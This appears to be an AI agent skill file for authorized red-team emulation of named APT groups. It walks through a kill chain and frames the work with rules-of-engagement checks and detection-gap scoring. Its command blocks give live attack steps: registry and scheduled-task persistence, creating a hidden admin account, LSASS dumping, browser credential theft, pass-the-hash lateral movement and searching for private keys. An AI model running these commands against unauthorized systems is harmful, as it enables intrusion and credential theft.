---
name: apt-emulation
description: "APT group emulation with 12+ threat actor profiles using real MITRE ATT&CK TTPs. Covers full kill chain: recon, exploitation, lateral movement, persistence, exfiltration, and C2 for authorized red team engagements."
allowed-tools: ["shell", "file", "exec"]
---

# APT Group Emulation

You are emulating the TTPs of an advanced persistent threat actor in an authorized red team engagement. Written authorization from the asset owner is mandatory before any action.

## Pre-Engagement Authorization Requirements

- Verify signed Rules of Engagement (ROE) document naming the emulated threat actor.
- Confirm scope: in-scope IP ranges, domains, user accounts, and explicit out-of-scope systems.
- Identify deconfliction contact at the blue team for emergency stop.
- Confirm data handling rules: no exfiltration of real PII even in simulation.
- Verify emergency stop procedure and shared signal (e.g., specific JIRA ticket state).

## Threat Actor Profile Selection

Reference module: `src/red_team/apt_emulation.rs — AptProfileRegistry`

Select a profile from the registry:

```bash
james security red-team apt-profiles --list
james security red-team apt-profiles --show APT29
```

| Group | Sponsor | Objective | Primary TTPs |
|---|---|---|---|
| APT28 (Fancy Bear) | Russia/GRU | Espionage | T1566.001, T1059.005, T1003.001, T1547.001 |
| APT29 (Cozy Bear) | Russia/SVR | Espionage | T1195.002, T1071.001, T1027, T1078 |
| Lazarus Group | North Korea/RGB | Financial/Sabotage | T1566.001, T1486, T1059.001, T1564 |
| Sandworm | Russia/GRU | Sabotage/ICS | T1486, T1561.002, T1195.001, T1059.001 |
| APT41 (Winnti) | China/MSS | Espionage+Criminal | T1190, T1059.001, T1078, T1568 |
| Kimsuky | North Korea | Espionage | T1566.001, T1005, T1041, T1055 |
| APT34 (OilRig) | Iran/MOIS | Espionage | T1566.001, T1059.006, T1136, T1071 |
| Scattered Spider | eCrime | Financial | T1621, T1556.006, T1539, T1213 |
| FIN7 | eCrime | Financial | T1566.001, T1204.002, T1059.001, T1003 |
| Volt Typhoon | China/PLA | Pre-positioning | T1078, T1190, T1105, T1036 |
| BlackCat/ALPHV | eCrime | Ransomware | T1486, T1490, T1048, T1078 |
| UNC2452 (Solorigate) | Russia/SVR | Supply Chain | T1195.002, T1027, T1562, T1071 |

## Full Kill Chain

Reference module: `src/red_team/kill_chain.rs — KillChainExecutor`

### Phase 1: Reconnaissance (TA0043)

```bash
# OSINT — passive recon only unless active recon is in scope
# Employee enumeration via LinkedIn OSINT
theHarvester -d $TARGET_DOMAIN -b linkedin,google,bing -l 500

# DNS enumeration
subfinder -d $TARGET_DOMAIN -all -recursive | anew subdomains.txt
dnsx -l subdomains.txt -a -aaaa -cname -mx -txt -resp

# Technology fingerprinting
whatweb https://$TARGET_DOMAIN
wappalyzer-cli https://$TARGET_DOMAIN

# Leaked credential search
james security intel leaked-creds --domain $TARGET_DOMAIN
```

Deliverable: Target profile document with personnel, infrastructure, technology stack.

### Phase 2: Resource Development (TA0042)

- Register lookalike domain for phishing (must be in ROE).
- Develop initial access payload matching threat actor's known tooling.
- Stand up C2 infrastructure (malleable C2 profile for actor emulation).

```bash
# Generate actor-specific Cobalt Strike malleable C2 profile
james security red-team c2-profile --actor APT29 --output apt29.profile

# Develop phishing lure document
james security red-team lure --actor APT28 --template "NATO_document" --output lure.docx
```

### Phase 3: Initial Access (TA0001)

Execute one or more initial access techniques per the ROE:

- **T1566.001 — Spearphishing Attachment:** Macro-enabled Office document or ISO lure.
- **T1190 — Exploit Public-Facing Application:** CVE exploitation against in-scope web app.
- **T1195.002 — Supply Chain Compromise:** Tampered build artifact (simulated only).
- **T1078 — Valid Accounts:** Credentials from earlier OSINT or phishing.

```bash
# Send phishing campaign (requires ROE authorization)
james security red-team phish --campaign-id $ID --target-list targets.csv

# Log initial access event
james security red-team log-event --technique T1566.001 --phase initial-access --outcome success
```

### Phase 4: Execution and Persistence (TA0002, TA0003)

```bash
# Deploy implant with actor-appropriate persistence
# T1547.001 — Registry Run Key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /d "C:\ProgramData\svchost.exe"

# T1053.005 — Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "C:\ProgramData\updater.exe" /sc daily /st 09:00

# T1136.001 — Create Local Account (if in scope)
net user backdoor P@ssw0rd123 /add
net localgroup administrators backdoor /add
```

Record all IOCs generated: registry keys, file hashes, scheduled task names, new accounts.

### Phase 5: Credential Access (TA0006)

```bash
# T1003.001 — LSASS Memory dump (requires admin)
# Mimikatz: sekurlsa::logonpasswords
# Nanodump (evasion-focused)
nanodump --write /tmp/lsass.dmp --elevate-handle

# T1555.003 — Browser Credential Extraction
SharpChrome logins
```

### Phase 6: Lateral Movement (TA0008)

```bash
# T1021.001 — RDP
xfreerdp /u:$USER /p:$PASS /v:$TARGET_IP /cert-ignore

# T1550.002 — Pass the Hash
impacket-wmiexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET_IP

# T1021.006 — WinRM
evil-winrm -i $TARGET_IP -u $USER -H $NTLM_HASH
```

### Phase 7: Collection and Exfiltration (TA0009, TA0010)

```bash
# T1005 — Data from Local System
find /home -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null

# T1041 — Exfiltration Over C2 Channel
# (simulated — no real data leaves environment)
james security red-team sim-exfil --bytes 1024 --label "simulated-exfil"
```

### Phase 8: Command and Control (TA0011)

- Use actor-appropriate C2 protocol (HTTPS, DNS-over-HTTPS, named pipes).
- Apply malleable C2 profile to mimic actor's known network signatures.
- Validate that blue team's network monitoring detects (or misses) C2 traffic.

## MITRE ATT&CK Technique Mapping

After each phase, update the technique log:

```bash
james security red-team technique-log \
  --engagement $ENGAGEMENT_ID \
  --technique T1566.001 \
  --phase initial-access \
  --detection-status "not-detected"
```

## Output Checklist

- [ ] Written authorization verified and filed
- [ ] Threat actor profile selected and documented
- [ ] Kill chain phases planned with ATT&CK technique mapping
- [ ] All phases executed within authorized scope
- [ ] IOCs recorded per phase
- [ ] Deconfliction contact updated after each phase
- [ ] Detection gaps identified and scored
- [ ] Final engagement report generated with dwell time and detection rate
